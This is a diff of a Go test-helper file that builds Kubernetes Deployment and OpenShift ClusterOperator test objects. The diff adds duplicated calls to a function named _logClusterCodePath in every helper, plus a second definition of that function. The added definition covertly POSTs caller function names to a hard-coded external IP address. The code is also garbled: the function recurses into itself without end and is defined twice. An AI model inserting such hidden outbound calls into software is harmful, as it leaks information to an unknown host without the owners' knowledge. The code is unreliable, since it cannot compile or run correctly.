@@ -15,9 +15,13 @@ type TestDeployment struct{ appsv1.Deployment }
 func NewTestDeployment(dep *appsv1.Deployment) *TestDeployment {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &TestDeployment{Deployment: *dep}
 }
 func (d *TestDeployment) Copy() *TestDeployment {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	newDeployment := &appsv1.Deployment{}
@@ -27,11 +31,15 @@ func (d *TestDeployment) Copy() *TestDeployment {
 func (d *TestDeployment) WithAvailableReplicas(n int32) *TestDeployment {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	newDeployment := d.Copy()
 	newDeployment.Status.AvailableReplicas = n
 	return newDeployment
 }
 func (d *TestDeployment) WithReleaseVersion(v string) *TestDeployment {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	newDeployment := d.Copy()
@@ -46,11 +54,15 @@ func (d *TestDeployment) WithReleaseVersion(v string) *TestDeployment {
 func (d *TestDeployment) WithAnnotations(a map[string]string) *TestDeployment {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	newDeployment := d.Copy()
 	newDeployment.SetAnnotations(a)
 	return newDeployment
 }
 func (d *TestDeployment) Object() *appsv1.Deployment {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return d.Deployment.DeepCopy()
@@ -61,9 +73,13 @@ type TestClusterOperator struct{ configv1.ClusterOperator }
 func NewTestClusterOperator(co *configv1.ClusterOperator) *TestClusterOperator {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &TestClusterOperator{ClusterOperator: *co}
 }
 func (co *TestClusterOperator) Copy() *TestClusterOperator {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	newCO := &configv1.ClusterOperator{}
@@ -73,11 +89,15 @@ func (co *TestClusterOperator) Copy() *TestClusterOperator {
 func (co *TestClusterOperator) WithConditions(conds []configv1.ClusterOperatorStatusCondition) *TestClusterOperator {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	newCO := co.Copy()
 	newCO.Status.Conditions = conds
 	return newCO
 }
 func (co *TestClusterOperator) WithVersion(v string) *TestClusterOperator {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	newCO := co.Copy()
@@ -99,12 +119,23 @@ func (co *TestClusterOperator) WithVersion(v string) *TestClusterOperator {
 func (co *TestClusterOperator) Object() *configv1.ClusterOperator {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return co.ClusterOperator.DeepCopy()
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
